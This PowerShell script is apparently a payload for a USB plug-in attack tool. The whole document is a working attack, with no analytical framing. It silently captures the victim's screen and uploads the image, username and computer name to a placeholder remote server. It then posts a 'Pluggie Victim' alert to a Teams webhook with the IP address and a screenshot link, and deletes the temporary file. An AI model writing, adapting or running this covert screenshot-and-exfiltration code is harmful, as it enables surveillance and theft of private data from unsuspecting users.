$uploadUrl = 'http://{{your-remote-server-ip}}:5000/api';
$teamsWebhookUrl = '{{teams-webhook-url}}'; 
Add-Type -AssemblyName System.Windows.Forms; 
Add-Type -AssemblyName System.Drawing; 
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; 
$graphics = [System.Drawing.Graphics]::FromImage($bitmap); 
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); 
$filePath = [System.IO.Path]::GetTempFileName() + '.jpeg'; 
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Jpeg); 
$bytes = [System.IO.File]::ReadAllBytes($filePath); 
$base64Image = [System.Convert]::ToBase64String($bytes); 
$body = @{image=$base64Image;username=$env:USERNAME;computername=$env:COMPUTERNAME} | ConvertTo-Json; 
$response = Invoke-RestMethod -Uri $uploadUrl -Method Post -Body $body -ContentType 'application/json'; 
$imageUrl = $response.image_url; 
$teamsMessage = @{
    '@type' = 'MessageCard'
    '@context' = 'http://schema.org/extensions'
    'summary' = 'Pluggie Victim Information'
    'title' = 'Pluggie Victim'
    'sections' = @(
        @{
            'activityTitle' = 'User Information'
            'facts' = @(
                @{
                    'name' = 'Computer Name'
                    'value' = $env:COMPUTERNAME
                },
                @{
                    'name' = 'Username'
                    'value' = $env:USERNAME
                },
                @{
                    'name' = 'IP Address'
                    'value' = (Test-Connection -ComputerName (hostname) -Count 1 | Select -ExpandProperty IPV4Address).IPAddressToString
                }
            )
        }
    )
    'potentialAction' = @(
        @{
            '@type' = 'OpenUri'
            'name' = 'View Screenshot'
            'targets' = @(
                @{
                    'os' = 'default'
                    'uri' = $imageUrl
                }
            )
        }
    )
} | ConvertTo-Json -Depth 4;
Invoke-RestMethod -Uri $teamsWebhookUrl -Method Post -Body $teamsMessage -ContentType 'application/json'; 
Remove-Item $filePath -Force;
